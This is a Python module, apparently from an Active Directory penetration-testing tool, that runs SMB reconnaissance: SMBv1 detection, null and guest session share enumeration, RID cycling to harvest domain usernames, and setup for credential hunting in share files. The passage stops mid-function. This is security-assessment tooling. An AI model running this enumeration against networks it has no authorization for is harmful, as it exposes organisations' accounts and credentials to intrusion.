"""SMB CLI orchestration helpers.

This module extracts SMB-related orchestration logic out of the monolithic
`adscan.py` so it can be reused by future UX layers while keeping runtime
behaviour stable for the current CLI.

Note: This module handles SMB enumeration and operations. For credential
extraction operations (dumps), see `dumps.py`.
"""

from __future__ import annotations

from typing import Any
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime, timedelta, timezone
from pathlib import Path
import json
import os
import re
import shlex
import threading
import traceback
import shutil
import rich
from rich.panel import Panel
from rich.prompt import Confirm, Prompt
from rich.table import Table
from rich.text import Text

from adscan_internal import (
    print_error,
    print_error_debug,
    print_exception,
    print_info,
    print_info_debug,
    print_info_verbose,
    print_panel,
    print_operation_header,
    print_success,
    print_warning,
    print_warning_debug,
    telemetry,
)
from adscan_internal.reporting_compat import handle_optional_report_service_exception
from adscan_internal.integrations.impacket.runner import (
    RunCommandAdapter,
    run_raw_impacket_command,
)
from adscan_internal.integrations.netexec.parsers import (
    parse_smb_user_descriptions,
)
from adscan_internal.text_utils import strip_ansi_codes
from adscan_internal.interaction import is_non_interactive
from adscan_internal.cli.target_scope_warning import (
    confirm_large_target_scope,
)
from adscan_internal.cli.ntlm_hash_finding_flow import (
    render_ntlm_hash_findings_flow,
)
from adscan_internal.cli.scan_outcome_flow import (
    artifact_records_extracted_nothing,
    collect_loot_file_preview,
    persist_artifact_processing_report as _persist_artifact_processing_report,
    render_artifact_processing_summary as _render_artifact_processing_summary,
    render_files_of_concern_panel,
    render_no_extracted_findings_preview,
    render_ranked_findings_panel,
)
from adscan_internal.rich_output import (
    BRAND_COLORS,
    mark_sensitive,
    print_panel_with_table,
    questionary_ordered_selection,
)
from adscan_internal.services.smb_guest_auth_service import (
    is_guest_alias,
    resolve_smb_guest_username,
)
from adscan_internal.services.credsweeper_service import (
    CREDSWEEPER_RULES_PROFILE_FILESYSTEM_DOC,
    CREDSWEEPER_RULES_PROFILE_FILESYSTEM_TEXT,
    get_default_credsweeper_jobs,
    get_default_credsweeper_timeout,
)
from adscan_internal.services.smb_exclusion_policy import (
    filter_share_map_by_global_smb_exclusions,
    filter_shares_by_global_smb_exclusions,
    is_globally_excluded_smb_share,
    is_globally_excluded_smb_relative_path,
    prune_excluded_walk_dirs,
)
from adscan_internal.services.smb_sensitive_file_policy import (
    DEFAULT_SMB_SENSITIVE_FILE_PROFILE,
    SMB_SENSITIVE_FILE_PROFILE_TEXT_ONLY,  # noqa: F401  re-exported for consumers/tests
    SMB_SENSITIVE_BENCHMARK_SCOPE_ALL_SUPPORTED,
    SMB_SENSITIVE_BENCHMARK_SCOPE_BINARY_ONLY,
    SMB_SENSITIVE_BENCHMARK_SCOPE_DOCUMENTS_DEPTH_EXPERIMENTAL,
    SMB_SENSITIVE_BENCHMARK_SCOPE_TEXT_ONLY,
    SMB_SENSITIVE_SCAN_PHASE_DOCUMENT_CREDENTIALS,
    SMB_SENSITIVE_SCAN_PHASE_TEXT_CREDENTIALS,
    get_manspider_phase_extensions,
    get_production_sensitive_scan_phase_sequence,
    get_sensitive_phase_definition,
    get_sensitive_phase_extensions,
    get_sensitive_phase_max_file_size_bytes,
    get_sensitive_file_extensions,
    resolve_effective_sensitive_extension,
)
from adscan_internal.services.rclone_tuning_service import (
    RcloneTuning,
    choose_rclone_tuning,
)
from adscan_internal.services.loot_credential_analysis_service import (
    ENGINE_AI as _SMB_LOOT_ANALYSIS_ENGINE_AI,
    ENGINE_BOTH as _SMB_LOOT_ANALYSIS_ENGINE_BOTH,
    ENGINE_CREDSWEEPER as _SMB_LOOT_ANALYSIS_ENGINE_CREDSWEEPER,
    merge_grouped_credential_findings as _merge_grouped_credential_findings,
    run_loot_credential_analysis,
    select_loot_credential_analysis_engine as _select_loot_credential_analysis_engine,
)
from adscan_internal.services.smb_sensitive_phase_orchestration_service import (
    run_staged_smb_sensitive_scan as _run_staged_smb_sensitive_scan,
    should_continue_with_deeper_sensitive_scan as _service_should_continue_with_deeper_sensitive_scan,
    should_continue_with_heavy_artifact_analysis as _service_should_continue_with_heavy_artifact_analysis,
    should_run_credential_phase as _service_should_run_credential_phase,
    should_skip_sensitive_scan_prompt_for_ctf_pwned as _service_should_skip_sensitive_scan_prompt_for_ctf_pwned,
)
from adscan_internal.services.spidering_service import ArtifactProcessingRecord
from adscan_internal.workspaces.computers import (
    count_target_file_entries,
    consume_service_targeting_fallback_notice,
    ensure_enabled_computer_ip_file,
    load_target_entries,
    resolve_domain_service_scope_preference,
    resolve_domain_service_target_file,
)
from adscan_internal.workspaces.subpaths import domain_path, domain_relpath
from adscan_core.output import print_empty_state
from adscan_internal.cli.smb_shares_view import SharesViewMode, run_native_shares_view

_SMB_HOST_IDENTITY_RE = re.compile(
    r"^\s*SMB\s+(?P<ip>\d{1,3}(?:\.\d{1,3}){3})\s+\d+\s+(?P<hostname>\S+)\s+"
)
_SMB_BANNER_FIELD_RE = re.compile(r"\(([^:()]+):([^)]+)\)")
_SMB_GUEST_SESSION_RE = re.compile(
    r"^\s*SMB\s+(?P<ip>\d{1,3}(?:\.\d{1,3}){3})\s+\d+\s+(?P<hostname>\S+)\s+"
    r"\[\+\].*\(\s*Guest\s*\)",
    re.IGNORECASE,
)
_SMB_TARGET_SCOPE_WARNING_THRESHOLD = 2048
_SMB_MAPPING_MODE_AUTO = "auto"
_SMB_MAPPING_MODE_REFRESH = "refresh"
_SMB_MAPPING_MODE_REUSE = "reuse"
_VALID_SMB_MAPPING_MODES = {
    _SMB_MAPPING_MODE_AUTO,
    _SMB_MAPPING_MODE_REFRESH,
    _SMB_MAPPING_MODE_REUSE,
}
_SMB_RCLONE_MAPPING_CACHE_MAX_AGE_AUDIT = timedelta(hours=4)


def parse_netexec_smbv1_output(output: str) -> dict[str, object]:
    """Parse NetExec SMB banner lines to identify hosts with SMBv1 enabled."""
    normalized = strip_ansi_codes(output or "").strip()
    if not normalized:
        return {}

    entries: list[dict[str, str]] = []
    all_hosts: list[str] = []
    smbv1_hosts: list[str] = []
    seen_all: set[str] = set()
    seen_smbv1: set[str] = set()

    for raw_line in normalized.splitlines():
        line = raw_line.strip()
        if not line or "(smbv1:" not in line.lower():
            continue

        match = _SMB_HOST_IDENTITY_RE.match(line)
        if not match:
            continue

        ip = match.group("ip")
        hostname = match.group("hostname")
        field_map: dict[str, str] = {}
        for field_match in _SMB_BANNER_FIELD_RE.finditer(line):
            key = str(field_match.group(1) or "").strip().lower()
            value = str(field_match.group(2) or "").strip()
            if key:
                field_map[key] = value

        smbv1_value = field_map.get("smbv1")
        signing_value = field_map.get("signing")
        null_auth_value = field_map.get("null auth")
        host_label = hostname or ip

        entry = {
            "host": host_label,
            "ip": ip,
            "hostname": hostname,
            "smbv1": str(smbv1_value or ""),
            "signing": str(signing_value or ""),
            "null_auth": str(null_auth_value or ""),
            "raw_line": line,
        }
        entries.append(entry)

        host_key = host_label.lower()
        if host_key not in seen_all:
            seen_all.add(host_key)
            all_hosts.append(host_label)

        if (
            str(smbv1_value or "").strip().lower() == "true"
            and host_key not in seen_smbv1
        ):
            seen_smbv1.add(host_key)
            smbv1_hosts.append(host_label)

    return {
        "raw_output": normalized,
        "count": len(smbv1_hosts),
        "all_hosts": all_hosts,
        "hosts": smbv1_hosts,
        "entries": entries,
    }


def _render_smbv1_summary(domain: str, summary: dict[str, object]) -> None:
    """Render a premium SMBv1 exposure summary."""
    all_hosts = (
        summary.get("all_computers")
        if isinstance(summary.get("all_computers"), list)
        else []
    )
    dc_hosts = summary.get("dcs") if isinstance(summary.get("dcs"), list) else []
    non_dc_hosts = (
        summary.get("non_dcs") if isinstance(summary.get("non_dcs"), list) else []
    )

    assessment = "No SMBv1 exposure detected"
    if dc_hosts:
        assessment = "Critical: SMBv1 enabled on Domain Controllers"
    elif non_dc_hosts:
        assessment = "Risky: SMBv1 enabled on domain hosts"

    print_panel(
        (
            f"Domain: {mark_sensitive(domain, 'domain')}\n"
            f"Hosts evaluated: {len(all_hosts)}\n"
            f"Hosts with SMBv1 enabled: {len(dc_hosts) + len(non_dc_hosts)}\n"
            f"Domain Controllers with SMBv1: {len(dc_hosts)}\n"
            f"Non-DC hosts with SMBv1: {len(non_dc_hosts)}\n"
            f"Assessment: {assessment}"
        ),
        title="SMBv1 Exposure Posture",
    )

    if not (dc_hosts or non_dc_hosts):
        return

    table = Table(show_header=True, header_style=f"bold {BRAND_COLORS['info']}")
    table.add_column("Segment")
    table.add_column("Count", justify="right")
    table.add_column("Sample")
    table.add_row(
        "Domain Controllers",
        str(len(dc_hosts)),
        ", ".join(mark_sensitive(host, "host") for host in dc_hosts[:5]) or "None",
    )
    table.add_row(
        "Non-DC Hosts",
        str(len(non_dc_hosts)),
        ", ".join(mark_sensitive(host, "host") for host in non_dc_hosts[:5]) or "None",
    )
    print_panel_with_table(
        table,
        title="Hosts with SMBv1 Enabled",
        border_style=BRAND_COLORS["warning"]
        if dc_hosts or non_dc_hosts
        else BRAND_COLORS["info"],
    )


def _record_smbv1_finding(
    shell: Any, *, domain: str, parsed: dict[str, object]
) -> None:
    """Persist SMBv1 exposure evidence into the technical report."""
    if not parsed:
        return

    try:
        from adscan_core.reporting.technical_report import record_technical_finding

        artifact_path = domain_relpath(shell.domains_dir, domain, "smb", "smbv1.log")
        record_technical_finding(
            shell,
            domain,
            key="smbv1_enabled",
            value=bool(parsed.get("hosts")),
            details=parsed,
            evidence=[
                {
                    "type": "artifact",
                    "summary": "NetExec SMB banner output with SMBv1 posture",
                    "artifact_path": artifact_path,
                }
            ],
        )
    except Exception as exc:  # pragma: no cover
        if not handle_optional_report_service_exception(
            exc,
            action="Technical finding sync",
            debug_printer=print_warning_debug,
            prefix="[smbv1]",
        ):
            telemetry.capture_exception(exc)
            print_warning_debug(
                f"[smbv1] Failed to persist technical finding: {type(exc).__name__}: {exc}"
            )


def _is_globally_excluded_mapping_share(share_name: str) -> bool:
    """Return True when share is excluded by global SMB mapping policy."""
    return is_globally_excluded_smb_share(share_name)


def _filter_shares_by_global_mapping_exclusions(shares: list[str]) -> list[str]:
    """Filter share names according to global SMB mapping exclusions."""
    return filter_shares_by_global_smb_exclusions(shares)


def _filter_share_map_by_global_mapping_exclusions(
    share_map: dict[str, dict[str, str]] | None,
) -> dict[str, dict[str, str]] | None:
    """Filter host/share permissions map according to global mapping exclusions."""
    return filter_share_map_by_global_smb_exclusions(share_map)


def _unique_casefold_sorted(values: list[str]) -> list[str]:
    """Return a deterministic, case-insensitive normalized list of strings."""
    normalized = {
        str(value).strip().casefold() for value in values if str(value).strip()
    }
    return sorted(normalized)


def _normalize_host_share_permissions(
    share_map: dict[str, dict[str, str]] | None,
) -> dict[str, dict[str, str]]:
    """Normalize one host/share permission map for stable cache comparisons."""
    normalized: dict[str, dict[str, str]] = {}
    for host_name, share_permissions in dict(share_map or {}).items():
        normalized_host = str(host_name or "").strip().casefold()
        if not normalized_host or not isinstance(share_permissions, dict):
            continue
        for share_name, permission in share_permissions.items():
            normalized_share = str(share_name or "").strip().casefold()
            normalized_permission = str(permission or "").strip()
            if not normalized_share or not normalized_permission:
                continue
            normalized.setdefault(normalized_host, {})[normalized_share] = (
                normalized_permission
            )
    return normalized


def _build_smb_rclone_mapping_cache_metadata(
    *,
    domain: str,
    username: str,
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
) -> dict[str, object]:
    """Build one stable SMB rclone mapping cache metadata snapshot."""
    return {
        "domain": str(domain or "").strip().casefold(),
        "principal": f"{domain}\\{username}".strip().casefold(),
        "requested_hosts": _unique_casefold_sorted(hosts),
        "requested_shares": _unique_casefold_sorted(shares),
        "host_share_permissions": _normalize_host_share_permissions(share_map),
    }


def _parse_smb_cache_timestamp(value: str) -> datetime | None:
    """Parse one persisted SMB cache timestamp into UTC."""
    normalized = str(value or "").strip()
    if not normalized:
        return None
    try:
        parsed = datetime.fromisoformat(normalized)
    except ValueError:
        return None
    if parsed.tzinfo is None:
        return parsed.replace(tzinfo=timezone.utc)
    return parsed.astimezone(timezone.utc)


def _resolve_smb_mapping_cache_age_seconds(timestamp: str) -> float | None:
    """Resolve cache age in seconds from a wall-clock timestamp string.

    Kept for call-sites that don't have a manifest path (mapping cache).
    For phase caches where the manifest path is available, prefer
    ``resolve_loot_cache_age_seconds(manifest_path)`` which uses
    ``os.path.getmtime`` and is immune to Kerberos clock-sync jumps.
    """
    parsed = _parse_smb_cache_timestamp(timestamp)
    if parsed is None:
        return None
    return max(0.0, (datetime.now(timezone.utc) - parsed).total_seconds())


def _resolve_smb_mapping_mode(shell: Any) -> str:
    """Resolve the SMB mapping cache policy override for one workflow run."""
    shell_override = (
        str(getattr(shell, "smb_mapping_cache_mode", "") or "").strip().lower()
    )
    if shell_override in _VALID_SMB_MAPPING_MODES:
        return shell_override
    env_override = (
        str(os.environ.get("ADSCAN_SMB_MAPPING_MODE", "") or "").strip().lower()
    )
    if env_override in _VALID_SMB_MAPPING_MODES:
        return env_override
    return _SMB_MAPPING_MODE_AUTO


def _is_dev_cache_selection_mode(shell: Any) -> bool:
    """Return True when dev mode should surface explicit cache reuse UX."""
    session_env = str(os.getenv("ADSCAN_SESSION_ENV", "") or "").strip().lower()
    shell_env = str(getattr(shell, "session_env", "") or "").strip().lower()
    return session_env == "dev" or shell_env == "dev"


def _select_dev_cache_action(
    *,
    shell: Any,
    title: str,
    summary_lines: list[str],
) -> str:
    """Ask one explicit cache action in dev mode when interactive selectors exist."""
    if not _is_dev_cache_selection_mode(shell):
        return "auto"
    selector = getattr(shell, "_questionary_select", None)
    if not callable(selector):
        print_info_debug(
            "Dev cache selection skipped because no interactive selector is available."
        )
        return "auto"
    prompt_title = title
    if summary_lines:
        prompt_title = f"{title}\n" + "\n".join(summary_lines)
    options = [
        "Reuse cached results (default)",
        "Refresh now",
    ]
    selected_idx = selector(prompt_title, options, default_idx=0)
    if selected_idx is None:
        return "auto"
    if selected_idx == 1:
        return "refresh"
    return "reuse"


def _count_smb_mapping_file_entries(
    *,
    cache_payload: dict[str, object],
    hosts: list[str],
    shares: list[str],
    share_map: dict[str, dict[str, str]] | None = None,
) -> int:
    """Count file entries relevant to the current SMB mapping scope."""
    hosts_bucket = dict(cache_payload.get("hosts") or {})
    requested_hosts = set(_unique_casefold_sorted(hosts))
    requested_shares = set(_unique_casefold_sorted(shares))
    normalized_share_map = _normalize_host_share_permissions(share_map)
    total_entries = 0

    for host_name, host_entry in hosts_bucket.items():
        normalized_host = str(host_name or "").strip().casefold()
        if requested_hosts and normalized_host not in requested_hosts:
            continue
        if not isinstance(host_entry, dict):
            continue
        shares_bucket = dict(host_entry.get("shares") or {})
        allowed_host_shares = set(normalized_share_map.get(normalized_host, {}))
        for share_name, share_entry in shares_bucket.items():
            normalized_share = str(share_name or "").strip().casefold()
            if requested_shares and normalized_share not in requested_shares:
                continue
            if allowed_host_shares and normalized_share not in allowed_host_shares:
                continue
            if not isinstance(share_entry, dict):
                continue
            files_bucket = dict(share_entry.get("files") or {})
            total_entries += len(files_bucket)
    return total_entries


def _is_smb_rclone_mapping_cache_compatible(
    *,
    cache_payload: dict[str, object],
    expected_metadata: dict[str, object],
) -> tuple[bool, str, str | None]:
    """Validate whether one persisted SMB rclone mapping can be reused safely."""
    schema_version = int(cache_payload.get("schema_version") or 0)
    if schema_version != 1:
        return False, "schema version mismatch", None
    cached_domain = str(cache_payload.get("domain") or "").strip().casefold()
    if cached_domain != str(expected_metadata.get("domain") or "").strip().casefold():
        return False, "domain mismatch", None

    principal_key = str(expected_metadata.get("principal") or "").strip()
    principals_bucket = dict(cache_payload.get("principals") or {})
    matched_principal_key = next(
        (
            cached_key
            for cached_key in principals_bucket
            if str(cached_key or "").strip().casefold() == principal_key
        ),
        None,
    )
    if not matched_principal_key:
        return False, "principal not found", None
    principal_bucket = principals_bucket.get(matched_principal_key)
    if not isinstance(principal_bucket, dict):
        return False, "principal bucket missing", None

    expected_hosts = list(expected_metadata.get("requested_hosts") or [])
    expected_shares = list(expected_metadata.get("requested_shares") or [])
    cached_runs = list(cache_payload.get("runs") or [])
    matching_run: dict[str, object] | None = None
    for run_entry in reversed(cached_runs):
        if not isinstance(run_entry, dict):
            continue
        cached_principal = str(run_entry.get("principal") or "").strip().casefold()
        if cached_principal != principal_key:
            continue
        if (
            _unique_casefold_sorted(list(run_entry.get("requested_hosts") or []))
            != expected_hosts
        ):
            continue
        if (
            _unique_casefold_sorted(list(run_entry.get("requested_shares") or []))
            != expected_shares
        ):
            continue
        matching_run = run_entry
        break
    if matching_run is None:
        return False, "no matching run metadata", None

    cached_permissions = _normalize_host_share_permissions(
        principal_bucket.get("host_share_permissions")
        if isinstance(principal_bucket.get("host_share_permissions"), dict)
        else {}
    )
    expected_permissions = dict(expected_metadata.get("host_share_permissions") or {})
    for host_name, share_permissions in expected_permissions.items():
        cached_host_permissions = cached_permissions.get(
            str(host_name or "").strip().casefold(), {}
        )
        for share_name, permission in dict(share_permissions).items():
            cached_permission = cached_host_permissions.get(
                str(share_name or "").strip().casefold()
            )
            if cached_permission != str(permission or "").strip():
                return False, "host/share permission mismatch", None

    hosts_bucket = dict(cache_payload.get("hosts") or {})
    if expected_permissions:
        for host_name, share_permissions in expected_permissions.items():
            matched_host_key = next(
                (
                    cached_host
                    for cached_host in hosts_bucket
                    if str(cached_host or "").strip().casefold()
                    == str(host_name or "").strip().casefold()
                ),
                None,
            )
            if not matched_host_key:
                return False, "expected host missing from mapping", None
            host_entry = hosts_bucket.get(matched_host_key)
            if not isinstance(host_entry, dict):
                return False, "expected host entry missing", None
            shares_bucket = dict(host_entry.get("shares") or {})
            for share_name in dict(share_permissions):
                share_exists = any(
                    str(cached_share or "").strip().casefold()
                    == str(share_name or "").strip().casefold()
                    for cached_share in shares_bucket
                )
                if not share_exists:
                    return False, "expected share missing from mapping", None

    cache_timestamp = (
        str(
            matching_run.get("timestamp") or cache_payload.get("updated_at") or ""
        ).strip()
        or None
    )
    return True, "compatible", cache_timestamp


def _resolve_smb_rclone_phase_cache_paths(
    shell: Any,
    *,
    domain: str,
    username: str,
    phase: str,
) -> dict[str, str]:
    """Resolve stable cache paths for one SMB rclone deterministic phase."""
    workspace_cwd = shell._get_workspace_cwd()
    cache_root_abs = domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        "rclone",
        "cache",
        _slugify_token(username),
        phase,
    )
    return {
        "cache_root_abs": cache_root_abs,
        "cache_root_rel": domain_relpath(
            shell.domains_dir,
            domain,
            shell.smb_dir,
            "rclone",
            "cache",
            _slugify_token(username),
            phase,
        ),
        "loot_dir": os.path.join(cache_root_abs, "loot"),
        "credsweeper_dir": os.path.join(cache_root_abs, "credsweeper"),
        "manifest_path": os.path.join(cache_root_abs, "phase_cache_manifest.json"),
    }


def _resolve_smb_loot_ai_history_path(
    shell: Any,
    *,
    domain: str,
    username: str,
    phase: str,
    backend: str,
) -> str:
    """Resolve one persistent history file for SMB loot-path AI analysis."""
    workspace_cwd = shell._get_workspace_cwd()
    return domain_path(
        workspace_cwd,
        shell.domains_dir,
        domain,
        shell.smb_dir,
        backend,
        "ai_history",
        _slugify_token(username),
        phase,
        "analysis_history.json",
    )


def _deserialize_cached_artifact_records(
    payload: list[dict[str, Any]] | None,
) -> list[ArtifactProcessingRecord]:
    """Restore serialized artifact cache payloads into record objects."""
    records: list[ArtifactProcessingRecord] = []
    for item in list(payload or []):
        if not isinstance(item, dict):
            continue
        records.append(
            ArtifactProcessingRecord(
                path=str(item.get("path", "") or "").strip(),
                filename=str(item.get("filename", "") or "").strip(),
                artifact_type=str(item.get("artifact_type", "") or "").strip(),
                status=str(item.get("status", "") or "").strip(),
                note=str(item.get("note", "") or "").strip(),
                manual_review=bool(item.get("manual_review", False)),
                details=dict(item.get("details") or {}),
            )
        )
    return records


def _has_any_accepted_share_session(output: str) -> bool:
    """Return True when share enumeration shows at least one accepted session.

    NetExec share scans can contain mixed outcomes across hosts in the same run.
    We only want a global "sessions not accepted" error when every host fails.
    """
    if not output:
        return False

    for raw_line in output.splitlines():
        line = strip_ansi_codes(raw_line or "").strip()
        if not line:
            continue
        lowered = line.lower()

        if "enumerated shares" in lowered:
            return True

        if "[+]" in line and (
            "(guest)" in lowered
            or "(pwn3d" in lowered
            or " status_success" in lowered
            or " no password" in lowered
        ):
            return True

    return False


# ---------------------------------------------------------------------------
# Native SMB connection builders — used by the migrated SMB orchestrators
# below (descriptions, null user enum, GPP, RID cycling). Wraps
# ``smb_machine_with_fallback`` so NTLM->Kerberos fallback is preserved on
# hardened DCs, and adds an explicit "null/guest" path that mirrors the
# anonymous NTLMSSP flag dance from ``unauth_probe_service``.
# ---------------------------------------------------------------------------


def _smb_config_for_auth(shell: Any, domain: str):
    """Build an SMBConfig for the stored domain credentials, or None."""
    from adscan_internal.services.smb_transport import SMBConfig

    domain_data = shell.domains_data.get(domain, {}) or {}
    auth_state = str(domain_data.get("auth") or "unauth").strip().lower()
    if auth_state not in ("auth", "pwned"):
        return None

    username = str(domain_data.get("username") or "").strip()
    password = str(domain_data.get("password") or "").strip()
    if not username or not password:
        return None

    nt_hash = password if shell.is_hash(password) else None
    plain_password = None if nt_hash else password

    pdc_ip = str(domain_data.get("pdc") or "").strip()
    pdc_hostname = str(domain_data.get("pdc_hostname") or "").strip() or None

    return SMBConfig(
        target_ip=pdc_ip,
        target_hostname=pdc_hostname,
        domain=domain,
        username=username,
        password=plain_password,
        nt_hash=nt_hash,
        auth_domain=domain,
        kdc_ip=pdc_ip,
        timeout=30,
    )


def _smb_config_for_guest(shell: Any, domain: str):
    """Build an SMBConfig for a Guest:<empty> SMB session."""
    from adscan_internal.services.smb_transport import SMBConfig

    domain_data = shell.domains_data.get(domain, {}) or {}
    pdc_ip = str(domain_data.get("pdc") or "").strip()
    pdc_hostname = str(domain_data.get("pdc_hostname") or "").strip() or None
    guest_username = resolve_smb_guest_username(shell=shell, domain=domain)
    # Guest / null session: Kerberos requires a principal + ticket.
    # Force NTLM-anonymous so the posture plan's Kerberos-first policy
    # doesn't crash with empty credentials (NoneType.native).
    return SMBConfig(
        target_ip=pdc_ip,
        target_hostname=pdc_hostname,
        domain=domain,
        username=guest_username,
        password="",
        auth_domain=domain,
        use_kerberos=False,
        timeout=30,
    )


async def _open_native_smb_for_auth_or_null(shell: Any, domain: str):
    """Return an async context manager that yields a logged-in SMBMachine.

    Uses authenticated creds when available (with NTLM->Kerberos fallback),
    otherwise opens a null SMB session via the validated helper from
    ``unauth_enrichment_service``.
    """
    from contextlib import asynccontextmanager

    from adscan_internal.services.smb_transport import smb_machine_with_fallback

    cfg = _smb_config_for_auth(shell, domain)
    if cfg is not None:
        return smb_machine_with_fallback(cfg)

    from adscan_internal.services.unauth_enrichment_service import (
        _open_null_smb_connection,
    )

    @asynccontextmanager
    async def _null_machine():
        from aiosmb.commons.interfaces.machine import SMBMachine

        domain_data = shell.domains_data.get(domain, {}) or {}
        target = str(domain_data.get("pdc") or "").strip()
        connection = await _open_null_smb_connection(target, 30)
        async with connection:
            _, login_err = await connection.login()
            if login_err is not None:
                raise login_err
            machine = SMBMachine(connection)
            async with machine:
                yield machine

    return _null_machine()


def _format_descriptions_as_netexec(*, pdc: str, domain_label: str, users: list) -> str:
    """Synthesise a NetExec ``smb --users`` text block from native SAMR records."""
    lines: list[str] = []
    lines.append(
        f"SMB         {pdc:<16} 445    DC               [+] {domain_label}\\Guest:"
    )
    lines.append(
        f"SMB         {pdc:<16} 445    DC               -Username-                     -Last PW Set-       -BadPW- -Description-"
    )
    for u in users:
        username = getattr(u, "username", "") or ""
        description = (
            getattr(u, "description", "")
            or getattr(u, "comment", "")
            or getattr(u, "full_name", "")
            or ""
        )
        lines.append(
            f"SMB         {pdc:<16} 445    DC               {username:<30} <never>             0       {description}"
        )
    lines.append(
        f"SMB         {pdc:<16} 445    DC               [*] Enumerated {len(users)} local users: {domain_label}"
    )
    return "\n".join(lines) + "\n"


def execute_smb_rid_cycling(
    shell: Any, *, domain: str, rid_max: int = 2000, local_auth: bool = False
) -> None:
    """Execute RID cycling natively via LSARPC and store discovered usernames.

    Uses a native aiosmb SMB connection +
    :func:`native_lsarpc_service.rid_cycle_via`. ``rid_max`` is the upper RID
    of the initial sweep; ``local_auth`` selects the local-account retry path.

    Behaviour preserved from the netexec path:
      * On any successful translation, the user list is written to
        ``users.txt`` and ``domains_data[domain]["auth"]`` is promoted to
        ``"guest"`` (mirroring the historical "guest session sufficed for
        RID cycling" signal).
      * If the initial 0..max sweep produced users, a second sweep up to
        RID 10000 is launched to capture longer user spaces.
      * Retry with ``--local-auth`` is preserved when the initial attempt
        is denied at the SMB layer (mirrors the legacy
        STATUS_NO_LOGON_SERVERS retry).
    """
    import asyncio

    from adscan_internal.services.native_lsarpc_service import (
        SID_TYPE_USER,
        SID_TYPE_COMPUTER,
        rid_cycle_via,
    )
    from adscan_internal.services.smb_transport import (
        SMBAccessDeniedError,
        SMBAuthError,
        SMBConnectionError,
        SMBTransportError,
        smb_machine_with_fallback,
    )

    try:
        max_rid = rid_max
        has_local_auth = local_auth

        config = _smb_config_for_guest(shell, domain)

        async def _drive(rid_end: int):
            async with smb_machine_with_fallback(config) as machine:
                return await rid_cycle_via(
                    machine,
                    domain_hint=domain,
                    rid_start=500,
                    rid_end=rid_end,
                    timeout=180,
                )

        marked_domain = mark_sensitive(domain, "domain")

        try:
            entries, status, error = asyncio.run(_drive(max_rid))
        except (SMBAuthError, SMBAccessDeniedError) as exc:
            telemetry.capture_exception(exc)
            if not has_local_auth:
                execute_smb_rid_cycling(
                    shell, domain=domain, rid_max=rid_max, local_auth=True
                )
                return
            print_error(
                f"RID cycling denied with a guest session on domain {marked_domain}: {exc}"
            )
            return
        except (SMBConnectionError, SMBTransportError) as exc:
            telemetry.capture_exception(exc)
            print_error(
                f"RID cycling connection error on domain {marked_domain}: {exc}"
            )
            return

        if status == "denied":
            print_error(
                f"RID cycling refused by the DC on domain {marked_domain} "
                f"(LSARPC denied). Detail: {error or '-'}"
            )
            return

        user_entries = [
            e for e in entries if e.sid_type in (SID_TYPE_USER, SID_TYPE_COMPUTER)
        ]

        if not user_entries:
            print_error(
                "Could not obtain usernames through RID cycling with a guest session on domain "
                f"{marked_domain}."
            )
            return

        print_success(
            f"RID cycling successful with a guest session on domain {marked_domain}"
        )

        if max_rid < 10000:
            print_info("Enumerating users by RID")
            try:
                expanded_entries, expanded_status, _ = asyncio.run(_drive(10000))
                if expanded_status == "done":
                    expanded_users = [
                        e
                        for e in expanded_entries
                        if e.sid_type in (SID_TYPE_USER, SID_TYPE_COMPUTER)
                    ]
                    if expanded_users:
                        user_entries = expanded_users
            except Exception as exc:
                telemetry.capture_exception(exc)

        seen: set[str] = set()
        users: list[str] = []
        for e in user_entries:
            uname = e.name.strip()
            if not uname or uname in seen:
                continue
            seen.add(uname)
            users.append(uname)

        if users:
            shell.domains_data[domain]["auth"] = "guest"
            shell._write_user_list_file(
                domain,
                "users.txt",
                users,
                merge_existing=True,
                update_source="SMB RID cycling",
            )
            shell._postprocess_user_list_file(
                domain,
                "users.txt",
                source="smb_rid_cycling",
            )
    except Exception as exc:
        telemetry.capture_exception(exc)
        print_error("Error executing RID cycling.")
        print_exception(show_locals=False, exception=exc)


def run_null_shares(shell: Any, *, domain: str) -> None:
    """Run SMB share enumeration via a null session and render results."""
    if shell.type == "ctf" and shell.domains_data[domain]["auth"] in ["auth", "pwned"]:
        return

    # Use the native aiosmb stack — pass username="" and credential="" so
    # _build_smb_config_for_host builds a proper null session SMBConfig.
    view_set = run_native_shares_view(
        shell,
        domain=domain,
        mode=SharesViewMode.LIVE,
        username="",
        credential="",
    )
    if view_set is not None:
        readable = [
            v for v in (getattr(view_set, "views", []) or [])
            if getattr(v, "is_readable_live", False)
        ]
        if readable:
            from adscan_internal.rich_output import print_success
            print_success(
                f"Null session readable shares: "
                f"{', '.join(mark_sensitive(v.name, 'text') for v in readable)}"
            )
    _offer_share_credential_hunt(
        shell, domain=domain, username="", credential="", view_set=view_set
    )


def _resolve_guest_smb_targets(shell: Any, *, domain: str) -> tuple[list[str], str]:
    """Resolve target tokens for guest SMB enumeration.

    Order of precedence:
    1. Explicit `guest_smb_targets` configured by start_unauth.
    2. Legacy files (`enabled_computers_ips.txt`, then `smb/ips.txt`).
    3. Validated PDC/DC as a last fallback.
    """
    domain_data = (
        shell.domains_data.get(domain, {}) if hasattr(shell, "domains_data") else {}
    )
    configured = domain_data.get("guest_smb_targets")
    tokens: list[str] = []

    if isinstance(configured, list):
        tokens = [str(value).strip() for value in configured if str(value).strip()]
    elif isinstance(configured, str):
        tokens = [
            part.strip() for part in re.split(r"[,\s]+", configured) if part.strip()
        ]

    if tokens:
        return tokens, "configured"

    workspace_dir = getattr(shell, "current_workspace_dir", None) or os.getcwd()
    enabled_computers, enabled_source = ensure_enabled_computer_ip_file(
        workspace_dir,
        shell.domains_dir,
        domain,
        domain_data,
    )
    if enabled_computers:
        return [enabled_computers], enabled_source

    smb_ips = domain_relpath(shell.domains_dir, domain, "smb", "ips.txt")
    if os.path.exists(smb_ips):
        return [smb_ips], "smb_ips_file"

    pdc_ip = str(domain_data.get("pdc", "")).strip()
    if pdc_ip:
        return [pdc_ip], "pdc_fallback"

    return [], "none"


def _normalize_smb_target_tokens(raw_value: Any) -> list[str]:
    """Normalize SMB target tokens from comma/space-separated input."""
    if isinstance(raw_value, (list, tuple, set)):
        source_tokens = [str(item).strip() for item in raw_value if str(item).strip()]
    else:
        raw = str(raw_value or "").strip()
        if not raw:
            return []
        source_tokens = [
            part.strip() for part in re.split(r"[,\s]+", raw) if part.strip()
        ]

    normalized: list[str] = []
    seen: set[str] = set()
    for token in source_tokens:
        key = token.casefold()
